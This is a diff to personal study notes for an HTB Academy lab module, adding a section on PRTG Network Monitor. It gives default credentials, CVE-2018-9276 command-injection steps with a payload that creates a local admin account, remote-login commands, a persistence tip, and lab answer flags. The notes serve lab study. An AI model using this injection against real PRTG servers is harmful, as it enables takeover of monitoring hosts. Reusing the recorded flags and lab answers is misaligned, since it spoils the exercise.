@@ -1,6 +1,6 @@
 # HTB Academy — Attacking Common Applications: Module Notes
 
-**Status:** In progress (Sections 1–14 of 33 complete)
+**Status:** In progress (Sections 1–15 of 33 complete)
 
 ---
 
@@ -649,3 +649,55 @@ type c:\loot\flag.txt
 - Creds: `admin:Welcome1`
 - Flag: `l00k_ma_no_AutH!` (at `c:\loot\flag.txt`)
 - Shell received as `NT AUTHORITY\SYSTEM`
+
+---
+
+## Section 15 — PRTG Network Monitor
+
+### Discovery & Fingerprinting
+PRTG runs on port 8080 (also 80, 443). Identified by Nmap as `Indy httpd <version> (Paessler PRTG bandwidth monitor)`.
+
+```
+curl -s http://<target>:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep prtgversion
+```
+
+Default credentials: `prtgadmin:prtgadmin` (often pre-filled on login page)
+Common weak password: `prtgadmin:Password123`
+
+### CVE-2018-9276 — Authenticated Command Injection
+Affects PRTG < 18.2.39. The Parameter field in notifications is passed directly to a PowerShell script without sanitization.
+
+**Attack steps:**
+1. Login to PRTG web UI
+2. Setup → Account Settings → Notifications → **Add new notification**
+3. Name it anything (e.g. `pwn`)
+4. Scroll down → tick **EXECUTE PROGRAM**
+5. Program File: `Demo exe notification - outfile.ps1`
+6. Parameter: `test.txt;<command>` — e.g. add local admin:
+```
+test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+```
+7. Save → click **Test** on the notification
+
+**Verify and connect:**
+```
+sudo crackmapexec smb <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
+evil-winrm -i <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
+```
+
+**Read flag:**
+```
+type C:\Users\Administrator\Desktop\flag.txt
+```
+
+### Key Gotchas
+- Blind command execution — no output returned; verify via CrackMapExec or connection attempt
+- Semicolon separates the dummy filename from the injected command: `test.txt;<payload>`
+- PRTG often runs as SYSTEM — new local admin user immediately gives full access
+- Can also use for persistence: schedule notification to run at specific times
+- Port 8080 is the default but can be changed in admin settings
+
+### Lab Answers
+- Version: `18.1.37.13946`
+- Creds: `prtgadmin:Password123`
+- Flag: `WhOs3_m0nit0ring_wH0?` (at `C:\Users\Administrator\Desktop\flag.txt`)
